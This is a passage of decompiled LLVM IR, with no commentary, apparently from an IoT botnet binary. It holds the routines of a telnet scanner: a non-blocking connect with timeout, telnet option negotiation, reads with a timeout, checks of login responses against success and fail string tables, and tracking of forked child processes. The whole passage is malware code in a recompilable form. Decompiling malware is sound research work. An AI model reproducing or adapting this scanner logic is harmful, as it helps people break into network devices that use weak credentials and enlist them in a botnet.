  br label %dec_label_pc_9ad0

dec_label_pc_9ad0:                                ; preds = %dec_label_pc_9ad0.lr.ph, %dec_label_pc_9ad0
  %storemerge615 = phi i32 [ 0, %dec_label_pc_9ad0.lr.ph ], [ %v1_9ae4, %dec_label_pc_9ad0 ]
  %v5_9adc = mul nuw nsw i32 %storemerge615, 4
  %v6_9adc = add i32 %v5_9adc, %v2_99cc
  %v7_9adc = inttoptr i32 %v6_9adc to i32*
  store i32 0, i32* %v7_9adc, align 4
  %v1_9ae4 = add nuw nsw i32 %storemerge615, 1
  %tmp53 = icmp ult i32 %v1_9ae4, 32
  br i1 %tmp53, label %dec_label_pc_9ad0, label %dec_label_pc_9af8

dec_label_pc_9af8:                                ; preds = %dec_label_pc_9ad0
  %v2_9b18 = load i32, i32* %v1_9a28, align 4
  %v2_9b2c = or i32 %v2_9b18, %v6_9a38
  store i32 %v2_9b2c, i32* %v1_9a28, align 4
  store i32 0, i32* @r2, align 4
  %v5_9b6c = call i32 @__libc_select(i32 %v1_9a5c, i32 %v2_99cc, i32 0, i32 %v2_99cc, i32 %v2_9a68)
  %v5_9b80 = icmp sgt i32 %v5_9b6c, 0
  br i1 %v5_9b80, label %dec_label_pc_9c24.preheader, label %dec_label_pc_9b84

dec_label_pc_9b84:                                ; preds = %dec_label_pc_9af8
  %v1_9b88 = add nsw i32 %stack_var_-44.024, 1
  %v7_9b98 = icmp slt i32 %v1_9b88, 10
  br i1 %v7_9b98, label %dec_label_pc_9ad0.lr.ph, label %dec_label_pc_9c24.preheader

dec_label_pc_9c24.preheader:                      ; preds = %dec_label_pc_9b84, %dec_label_pc_9af8, %dec_label_pc_9b90.preheader, %dec_label_pc_9a08
  %v5_9bcc = bitcast i8* %stack_var_-185 to i32*
  %not.v7_9c2c57 = icmp sgt i32 %arg3, 1
  %v2_9c4459 = icmp eq i1 %not.v7_9c2c57, false
  br i1 %v2_9c4459, label %dec_label_pc_9c4c, label %dec_label_pc_9bb0

dec_label_pc_9bb0:                                ; preds = %dec_label_pc_9c24.preheader, %dec_label_pc_9c18
  %v1_9c2862.in = phi i32 [ %v1_9c2862, %dec_label_pc_9c18 ], [ %arg3, %dec_label_pc_9c24.preheader ]
  %stack_var_-40.061 = phi i8* [ %v5_9c08, %dec_label_pc_9c18 ], [ %arg2, %dec_label_pc_9c24.preheader ]
  %stack_var_-36.060 = phi i32 [ %v1_9c1c, %dec_label_pc_9c18 ], [ 0, %dec_label_pc_9c24.preheader ]
  %v1_9c2862 = add i32 %v1_9c2862.in, -1
  %v2_9bb4 = load i32, i32* @global_var_265cc.54, align 4
  %v6_9bcc = call i32 @__libc_recv(i32 %v2_9bb4, i32* %v5_9bcc, i32 1, i32 0, i32 %v1_9c2862)
  %v7_9bd4 = icmp eq i32 %v6_9bcc, 1
  br i1 %v7_9bd4, label %dec_label_pc_9bf4, label %dec_label_pc_9bdc

dec_label_pc_9bdc:                                ; preds = %dec_label_pc_9bb0
  store i8 0, i8* %stack_var_-40.061, align 1
  br label %dec_label_pc_9c60

dec_label_pc_9bf4:                                ; preds = %dec_label_pc_9bb0
  %v3_9bf4 = load i8, i8* %stack_var_-185, align 1
  %v4_9bf8 = ptrtoint i8* %stack_var_-40.061 to i32
  store i8 %v3_9bf4, i8* %stack_var_-40.061, align 1
  %v1_9c04 = add i32 %v4_9bf8, 1
  %v5_9c08 = inttoptr i32 %v1_9c04 to i8*
  %v3_9c0c = load i8, i8* %stack_var_-185, align 1
  %v7_9c10 = icmp eq i8 %v3_9c0c, 10
  br i1 %v7_9c10, label %dec_label_pc_9c4c, label %dec_label_pc_9c18

dec_label_pc_9c18:                                ; preds = %dec_label_pc_9bf4
  %v1_9c1c = add i32 %stack_var_-36.060, 1
  %not.v7_9c2c = icmp sgt i32 %v1_9c2862, 1
  %v2_9c44 = icmp eq i1 %not.v7_9c2c, false
  br i1 %v2_9c44, label %dec_label_pc_9c4c, label %dec_label_pc_9bb0

dec_label_pc_9c4c:                                ; preds = %dec_label_pc_9bf4, %dec_label_pc_9c18, %dec_label_pc_9c24.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9c24.preheader ], [ %v1_9c1c, %dec_label_pc_9c18 ], [ %stack_var_-36.060, %dec_label_pc_9bf4 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9c24.preheader ], [ %v5_9c08, %dec_label_pc_9c18 ], [ %v5_9c08, %dec_label_pc_9bf4 ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9c60

dec_label_pc_9c60:                                ; preds = %dec_label_pc_9bdc, %dec_label_pc_9c4c
  %storemerge = phi i32 [ -1, %dec_label_pc_9bdc ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9c4c ]
  %v2_9c6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9c6c, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_9c2862, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.061, { 1, 2, 0 }
  uselistorder i32 %v1_9b88, { 1, 0 }
  uselistorder i32 %storemerge615, { 1, 0 }
  uselistorder i32 %storemerge527, { 1, 0 }
  uselistorder i32 %v2_99cc, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9c60, { 1, 0 }
  uselistorder label %dec_label_pc_9c4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9bb0, { 1, 0 }
  uselistorder label %dec_label_pc_9ad0, { 1, 0 }
  uselistorder label %dec_label_pc_9ad0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_99e0, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9c7c = load i32, i32* @fp, align 4
  %v1_9c90 = add i32 %arg1, 4
  %v2_9c90 = inttoptr i32 %v1_9c90 to i32*
  %v3_9c90 = load i32, i32* %v2_9c90, align 4
  store i32 %v3_9c90, i32* @r0, align 4
  %v1_9c9c = inttoptr i32 %v3_9c90 to i32*
  %v2_9c9c = call i32 @__GI_inet_ntoa(i32* %v1_9c9c)
  store i32 %v3_9c7c, i32* @fp, align 4
  ret i32 %v2_9c9c
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_9cb4 = load i32, i32* @fp, align 4
  store i32 40124, i32* %stack_var_-4, align 4
  %v2_9cb8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9cb8, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_9ce0 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_9cf4 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_9d04 = load i8, i8* %arg3, align 1
  %v2_9d08 = icmp eq i8 %v2_9d04, -1
  br i1 %v2_9d08, label %dec_label_pc_9d10, label %dec_label_pc_9d20

dec_label_pc_9d10:                                ; preds = %entry
  %v3_9d04 = zext i8 %v2_9d04 to i32
  %v6_9d1c = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %v3_9d04, i32 %v5_9cf4)
  br label %dec_label_pc_9d20

dec_label_pc_9d20:                                ; preds = %entry, %dec_label_pc_9d10
  %v3_9d24 = load i32, i32* %stack_var_0, align 4
  %v3_9d28 = call i32 @contains_string(i32 %tmp, i32 %v3_9d24)
  %v2_9d30 = icmp ne i32 %v3_9d28, 0
  %. = zext i1 %v2_9d30 to i32
  store i32 %v3_9cb4, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8 %v2_9d04, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_9d20, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9da0.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9d60 = load i32, i32* @fp, align 4
  store i32 %v3_9d60, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_9d8c = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_9da0

dec_label_pc_9da0:                                ; preds = %dec_label_pc_9da0.lr.ph, %dec_label_pc_9da0
  %storemerge25 = phi i32 [ 0, %dec_label_pc_9da0.lr.ph ], [ %v1_9db4, %dec_label_pc_9da0 ]
  %v5_9dac = mul nuw nsw i32 %storemerge25, 4
  %v6_9dac = add i32 %v5_9dac, %v2_9d8c
  %v7_9dac = inttoptr i32 %v6_9dac to i32*
  store i32 0, i32* %v7_9dac, align 4
  %v1_9db4 = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_9db4, 32
  br i1 %tmp21, label %dec_label_pc_9da0, label %dec_label_pc_9dc8

dec_label_pc_9dc8:                                ; preds = %dec_label_pc_9da0
  %v13_9d60 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9dcc = udiv i32 %arg1, 32
  %v3_9dd8 = mul nuw nsw i32 %v3_9dcc, 4
  %v2_9de0 = add nsw i32 %v3_9dd8, -136
  %v2_9de4 = add i32 %v2_9de0, %v13_9d60
  %v1_9de8 = inttoptr i32 %v2_9de4 to i32*
  %v2_9de8 = load i32, i32* %v1_9de8, align 4
  %v1_9df0 = urem i32 %arg1, 32
  %v6_9df8 = shl i32 1, %v1_9df0
  %v2_9dfc = or i32 %v2_9de8, %v6_9df8
  store i32 %v2_9dfc, i32* %v1_9de8, align 4
  %v1_9e1c = add i32 %arg1, 1
  %v2_9e24 = ptrtoint i32* %stack_var_-160 to i32
  %v5_9e38 = call i32 @__libc_select(i32 %v1_9e1c, i32 %v2_9d8c, i32 0, i32 0, i32 %v2_9e24)
  %v5_9e44 = icmp sgt i32 %v5_9e38, 0
  br i1 %v5_9e44, label %dec_label_pc_9e54, label %dec_label_pc_9e48

dec_label_pc_9e48:                                ; preds = %dec_label_pc_9dc8
  br label %dec_label_pc_9e74

dec_label_pc_9e54:                                ; preds = %dec_label_pc_9dc8
  %v5_9e68 = inttoptr i32 %arg3 to i32*
  %v6_9e68 = call i32 @__libc_recv(i32 %arg1, i32* %v5_9e68, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_9e74

dec_label_pc_9e74:                                ; preds = %dec_label_pc_9e48, %dec_label_pc_9e54
  %storemerge = phi i32 [ %v6_9e68, %dec_label_pc_9e54 ], [ 0, %dec_label_pc_9e48 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_9d8c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_9e74, { 1, 0 }
  uselistorder label %dec_label_pc_9da0, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_9ea0 = icmp eq i32 %arg2, 0
  br i1 %v2_9ea0, label %dec_label_pc_9ea8, label %dec_label_pc_9eb8

dec_label_pc_9ea8:                                ; preds = %entry
  %v2_9eac = load i32, i32* %arg1, align 4
  %v1_9eb4 = call i32 @__libc_close(i32 %v2_9eac)
  br label %dec_label_pc_9eb8

dec_label_pc_9eb8:                                ; preds = %entry, %dec_label_pc_9ea8
  %v2_9ec0 = add i32 %tmp, 16
  %v3_9ec0 = inttoptr i32 %v2_9ec0 to i32*
  store i32 0, i32* %v3_9ec0, align 4
  %v3_9ec4 = load i32, i32* %stack_var_-24, align 4
  %v1_9ed0 = trunc i32 %v3_9ec4 to i8
  %v3_9ed0 = add i32 %tmp, 8
  %v4_9ed0 = inttoptr i32 %v3_9ed0 to i8*
  store i8 %v1_9ed0, i8* %v4_9ed0, align 1
  %v1_9ed8 = add i32 %tmp, 24
  %v2_9ed8 = inttoptr i32 %v1_9ed8 to i32*
  %v3_9ed8 = load i32, i32* %v2_9ed8, align 4
  store i32 512, i32* @r2, align 4
  %v2_9ee8 = inttoptr i32 %v3_9ed8 to i8*
  %v3_9ee8 = call i32 @__GI_memset(i8* %v2_9ee8, i32 0)
  ret i32 %v3_9ee8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9eb8, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9ef8 = load i32, i32* @fp, align 4
  %v2_9f10 = inttoptr i32 %arg1 to i32*
  %v3_9f10 = call i32 @advance_state(i32* %v2_9f10, i32 0)
  %v3_9f1c = add i32 %arg1, 9
  %v4_9f1c = inttoptr i32 %v3_9f1c to i8*
  store i8 1, i8* %v4_9f1c, align 1
  store i32 %v3_9ef8, i32* @fp, align 4
  ret i32 %v3_9f10
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9f28 = load i32, i32* @fp, align 4
  %v3_9f40 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_26208.61 to i32))
  store i32 %v3_9f28, i32* @fp, align 4
  ret i32 %v3_9f40
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9f58 = load i32, i32* @fp, align 4
  %v3_9f70 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_261e8.70 to i32))
  store i32 %v3_9f58, i32* @fp, align 4
  ret i32 %v3_9f70

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40848, i32* %stack_var_-4, align 4
  %v2_9f8c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9f8c, i32* @fp, align 4
  %v1_9f9c = call i32 @contains_success(i32 %arg1)
  %v2_9fa4 = icmp eq i32 %v1_9f9c, 0
  br i1 %v2_9fa4, label %dec_label_pc_9fac, label %dec_label_pc_9fd4

dec_label_pc_9fac:                                ; preds = %entry
  %v1_9fb0 = call i32 @contains_fail(i32 %arg1)
  %v2_9fb8 = icmp ne i32 %v1_9fb0, 0
  %. = zext i1 %v2_9fb8 to i32
  br label %dec_label_pc_9fd4

dec_label_pc_9fd4:                                ; preds = %dec_label_pc_9fac, %entry
  %storemerge1 = phi i32 [ 1, %entry ], [ %., %dec_label_pc_9fac ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_a014

dec_label_pc_a014:                                ; preds = %dec_label_pc_a014, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_a018, %dec_label_pc_a014 ]
  %v1_a018 = add i32 %stack_var_-24.0, 1
  %v3_a024 = mul i32 %v1_a018, 4
  %v2_a030 = add i32 %v3_a024, %arg2
  %v1_a034 = inttoptr i32 %v2_a030 to i32*
  %v2_a034 = load i32, i32* %v1_a034, align 4
  %v2_a038 = icmp eq i32 %v2_a034, 0
  br i1 %v2_a038, label %dec_label_pc_a094.preheader, label %dec_label_pc_a014

dec_label_pc_a094.preheader:                      ; preds = %dec_label_pc_a014
  %v3_a06c = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_a094

dec_label_pc_a04c:                                ; preds = %dec_label_pc_a094
  %v3_a050 = mul i32 %storemerge2, 4
  %v2_a05c = add i32 %v3_a050, %arg2
  %v1_a060 = inttoptr i32 %v2_a05c to i32*
  %v2_a060 = load i32, i32* %v1_a060, align 4
  %v4_a06c = call i32 @strcasestr(i8* %v3_a06c, i32 %v2_a060, i32 %v3_a050)
  %v2_a074 = icmp eq i32 %v4_a06c, 0
  %v1_a08c = add nuw i32 %storemerge2, 1
  br i1 %v2_a074, label %dec_label_pc_a094, label %dec_label_pc_a0ac

dec_label_pc_a094:                                ; preds = %dec_label_pc_a04c, %dec_label_pc_a094.preheader
  %storemerge2 = phi i32 [ %v1_a08c, %dec_label_pc_a04c ], [ 0, %dec_label_pc_a094.preheader ]
  %v5_a0a0 = icmp slt i32 %storemerge2, %v1_a018
  br i1 %v5_a0a0, label %dec_label_pc_a04c, label %dec_label_pc_a0ac

dec_label_pc_a0ac:                                ; preds = %dec_label_pc_a094, %dec_label_pc_a04c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_a04c ], [ 0, %dec_label_pc_a094 ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_a018, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a0c0 = load i32, i32* @fp, align 4
  store i32 %v3_a0c0, i32* %stack_var_-16, align 4
  %v13_a0c0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r2, align 4
  %v2_a0e8 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a0f8 = or i32 %v2_a0e8, 2048
  store i32 %v1_a0f8, i32* @r2, align 4
  %v2_a10c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_a128 = urem i32 %arg3, 65536
  %v1_a130 = call i32 @htons(i32 %v3_a128)
  %v3_a158 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_a160 = icmp eq i32 %v3_a158, 0
  br i1 %v2_a160, label %dec_label_pc_a174, label %dec_label_pc_a168

dec_label_pc_a168:                                ; preds = %entry
  br label %dec_label_pc_a32c

dec_label_pc_a174:                                ; preds = %entry
  %v3_a19c = bitcast i32* %stack_var_-48 to %sockaddr*
  %v4_a19c = call i32 @__libc_connect(i32 %arg1, %sockaddr* %v3_a19c, i32 16)
  %v1_a1ac = icmp slt i32 %v4_a19c, 0
  br i1 %v1_a1ac, label %dec_label_pc_a1b4, label %dec_label_pc_a2f0

dec_label_pc_a1b4:                                ; preds = %dec_label_pc_a174
  %v0_a1b4 = call i32 @__errno_location()
  %v1_a1bc = inttoptr i32 %v0_a1b4 to i32*
  %v2_a1bc = load i32, i32* %v1_a1bc, align 4
  %v7_a1c0 = icmp eq i32 %v2_a1bc, 115
  br i1 %v7_a1c0, label %dec_label_pc_a1ec.lr.ph, label %dec_label_pc_a2e4

dec_label_pc_a1ec.lr.ph:                          ; preds = %dec_label_pc_a1b4
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_a1d8 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_a1ec

dec_label_pc_a1ec:                                ; preds = %dec_label_pc_a1ec.lr.ph, %dec_label_pc_a1ec
  %storemerge14 = phi i32 [ 0, %dec_label_pc_a1ec.lr.ph ], [ %v1_a200, %dec_label_pc_a1ec ]
  %v5_a1f8 = mul nuw nsw i32 %storemerge14, 4
  %v6_a1f8 = add i32 %v5_a1f8, %v2_a1d8
  %v7_a1f8 = inttoptr i32 %v6_a1f8 to i32*
  store i32 0, i32* %v7_a1f8, align 4
  %v1_a200 = add nuw nsw i32 %storemerge14, 1
  %tmp32 = icmp ult i32 %v1_a200, 32
  br i1 %tmp32, label %dec_label_pc_a1ec, label %dec_label_pc_a214

dec_label_pc_a214:                                ; preds = %dec_label_pc_a1ec
  %v3_a218 = udiv i32 %arg1, 32
  %v3_a224 = mul nuw nsw i32 %v3_a218, 4
  %v2_a22c = add nsw i32 %v3_a224, -160
  %v2_a230 = add i32 %v2_a22c, %v13_a0c0
  %v1_a234 = inttoptr i32 %v2_a230 to i32*
  %v2_a234 = load i32, i32* %v1_a234, align 4
  %v1_a23c = urem i32 %arg1, 32
  %v6_a244 = shl i32 1, %v1_a23c
  %v2_a248 = or i32 %v2_a234, %v6_a244
  store i32 %v2_a248, i32* %v1_a234, align 4
  %v1_a268 = add i32 %arg1, 1
  %v2_a270 = ptrtoint i32* %stack_var_-184 to i32
  %v5_a288 = call i32 @__libc_select(i32 %v1_a268, i32 0, i32 %v2_a1d8, i32 0, i32 %v2_a270)
  %tmp33 = icmp slt i32 %v5_a288, 1
  br i1 %tmp33, label %dec_label_pc_a2d8, label %dec_label_pc_a298

dec_label_pc_a298:                                ; preds = %dec_label_pc_a214
  %v0_a2bc = call i32 @getsockopt()
  %v3_a2c0 = load i32, i32* %stack_var_-192, align 4
  %v2_a2c4 = icmp eq i32 %v3_a2c0, 0
  br i1 %v2_a2c4, label %dec_label_pc_a2f0, label %dec_label_pc_a2cc

dec_label_pc_a2cc:                                ; preds = %dec_label_pc_a298
  br label %dec_label_pc_a32c

dec_label_pc_a2d8:                                ; preds = %dec_label_pc_a214
  br label %dec_label_pc_a32c

dec_label_pc_a2e4:                                ; preds = %dec_label_pc_a1b4
  br label %dec_label_pc_a32c

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a174, %dec_label_pc_a298
  store i32 0, i32* @r2, align 4
  %v2_a2fc = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a30c = and i32 %v2_a2fc, -2049
  store i32 %v1_a30c, i32* @r2, align 4
  %v2_a320 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_a32c

dec_label_pc_a32c:                                ; preds = %dec_label_pc_a2e4, %dec_label_pc_a2d8, %dec_label_pc_a2cc, %dec_label_pc_a168, %dec_label_pc_a2f0
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_a2d8 ], [ 1, %dec_label_pc_a2f0 ], [ 0, %dec_label_pc_a2cc ], [ 0, %dec_label_pc_a2e4 ], [ 0, %dec_label_pc_a168 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_a1d8, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 1, 0, 5, 6, 7 }
  uselistorder label %dec_label_pc_a32c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a2f0, { 1, 0 }
  uselistorder label %dec_label_pc_a1ec, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_a33c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_a33c, i32* @ip, align 4
  %v3_a340 = load i32, i32* @r4, align 4
  %v6_a340 = load i32, i32* @r5, align 4
  %v9_a340 = load i32, i32* @r6, align 4
  %v0_a34c = call i32 @__libc_fork()
  %v2_a35c = icmp eq i32 %v0_a34c, 0
  br i1 %v2_a35c, label %dec_label_pc_a4bc, label %dec_label_pc_a370

dec_label_pc_a370:                                ; preds = %entry
  %v2_a374 = load i32, i32* @global_var_265d4.72, align 4
  %v5_a374 = load i32, i32* @global_var_265d8.73, align 4
  %v2_a380 = add i32 %v2_a374, 1
  %v3_a380 = icmp eq i32 %v2_a380, 0
  %v4_a384 = zext i1 %v3_a380 to i32
  %v5_a384 = add i32 %v4_a384, %v5_a374
  store i32 %v2_a380, i32* @global_var_265d4.72, align 4
  store i32 %v5_a384, i32* @global_var_265d8.73, align 4
  %v3_a398 = udiv i32 %v2_a380, 1073741824
  %v3_a39c = mul i32 %v5_a384, 4
  %v2_a3a0 = or i32 %v3_a39c, %v3_a398
  store i32 %v2_a3a0, i32* @r4, align 4
  %v3_a3a4 = mul i32 %v2_a380, 4
  %v1_a3a8 = add i32 %v3_a3a4, 4
  %v1_a3b0 = call i32 @malloc(i32 %v1_a3a8)
  br label %dec_label_pc_a408

dec_label_pc_a3c8:                                ; preds = %dec_label_pc_a408, %dec_label_pc_a454
  %v3_a3cc = mul i32 %storemerge2, 4
  %v2_a3d8 = add i32 %v3_a3cc, %v1_a3b0
  %v2_a3ec = load i32, i32* @global_var_2c854.75, align 4
  %v2_a3f0 = add i32 %v2_a3ec, %v3_a3cc
  %v1_a3f4 = inttoptr i32 %v2_a3f0 to i32*
  %v2_a3f4 = load i32, i32* %v1_a3f4, align 4
  %v2_a3f8 = inttoptr i32 %v2_a3d8 to i32*
  store i32 %v2_a3f4, i32* %v2_a3f8, align 4
  %v1_a400 = add i32 %storemerge2, 1
  br label %dec_label_pc_a408

dec_label_pc_a408:                                ; preds = %dec_label_pc_a370, %dec_label_pc_a3c8
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a370 ], [ %v1_a400, %dec_label_pc_a3c8 ]
  %v2_a420 = load i32, i32* @global_var_265d4.72, align 4
  %v5_a420 = load i32, i32* @global_var_265d8.73, align 4
  %v2_a434 = add i32 %v2_a420, -1
  %v3_a434 = icmp ne i32 %v2_a420, 0
  %v3_a438 = add i32 %v5_a420, -1
  %v5_a438 = sext i1 %v3_a434 to i32
  %v9_a44c = icmp eq i32 %v3_a438, %v5_a438
  br i1 %v9_a44c, label %dec_label_pc_a454, label %dec_label_pc_a3c8

dec_label_pc_a454:                                ; preds = %dec_label_pc_a408
  store i32 %v2_a434, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a434, %storemerge2
  br i1 %tmp, label %dec_label_pc_a3c8, label %dec_label_pc_a474

dec_label_pc_a474:                                ; preds = %dec_label_pc_a454
  store i32 %v5_a420, i32* @r4, align 4
  %v3_a47c = mul i32 %v2_a420, 4
  %v2_a488 = add i32 %v1_a3b0, -4
  %v1_a48c = add i32 %v2_a488, %v3_a47c
  %v2_a494 = inttoptr i32 %v1_a48c to i32*
  store i32 %v0_a34c, i32* %v2_a494, align 4
  %v2_a49c = load i32, i32* @global_var_2c854.75, align 4
  store i32 %v2_a49c, i32* @r0, align 4
  %v0_a4a4 = call i32 @free()
  store i32 %v1_a3b0, i32* @global_var_2c854.75, align 4
  br label %dec_label_pc_a4bc

dec_label_pc_a4bc:                                ; preds = %entry, %dec_label_pc_a474
  store i32 %v3_a340, i32* @r4, align 4
  store i32 %v6_a340, i32* @r5, align 4
  store i32 %v9_a340, i32* @r6, align 4
  ret i32 %v0_a34c

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a3cc, { 1, 0 }
  uselistorder i32 %v1_a3b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a4bc, { 1, 0 }
  uselistorder label %dec_label_pc_a408, { 1, 0 }
  uselistorder label %dec_label_pc_a3c8, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a4f4 = add i32 %arg2, 1
  %v1_a4f8 = inttoptr i32 %v1_a4f4 to i8*
  %v2_a4f8 = load i8, i8* %v1_a4f8, align 1
  %v7_a504 = icmp ult i8 %v2_a4f8, -5
  br i1 %v7_a504, label %dec_label_pc_a650, label %dec_label_pc_a50c

dec_label_pc_a50c:                                ; preds = %entry
  %v7_a514 = icmp eq i8 %v2_a4f8, -1
  br i1 %v7_a514, label %dec_label_pc_a518, label %dec_label_pc_a534

dec_label_pc_a518:                                ; preds = %dec_label_pc_a50c
  br label %dec_label_pc_a650

dec_label_pc_a534:                                ; preds = %dec_label_pc_a50c
  store i8 -1, i8* %stack_var_-17, align 1
  %v5_a550 = bitcast i8* %stack_var_-17 to i32*
  %v6_a550 = call i32 @__libc_send(i32 %arg1, i32* %v5_a550, i32 1, i32 16384)
  %v2_a55c = load i8, i8* %v1_a4f8, align 1
  %v7_a560 = icmp eq i8 %v2_a55c, -4
  br i1 %v7_a560, label %dec_label_pc_a568, label %dec_label_pc_a574

dec_label_pc_a568:                                ; preds = %dec_label_pc_a534
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a614

dec_label_pc_a574:                                ; preds = %dec_label_pc_a534
  %v2_a57c = load i8, i8* %v1_a4f8, align 1
  %v7_a580 = icmp eq i8 %v2_a57c, -2
  br i1 %v7_a580, label %dec_label_pc_a588, label %dec_label_pc_a594

dec_label_pc_a588:                                ; preds = %dec_label_pc_a574
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a614

dec_label_pc_a594:                                ; preds = %dec_label_pc_a574
  %v2_a59c = load i8, i8* %v1_a4f8, align 1
  %v7_a5a0 = icmp eq i8 %v2_a59c, 3
  %v7_a5b4 = icmp eq i8 %v2_a59c, -3
  br i1 %v7_a5a0, label %dec_label_pc_a5a8, label %dec_label_pc_a5e0

dec_label_pc_a5a8:                                ; preds = %dec_label_pc_a594
  br i1 %v7_a5b4, label %dec_label_pc_a5bc, label %dec_label_pc_a5c8

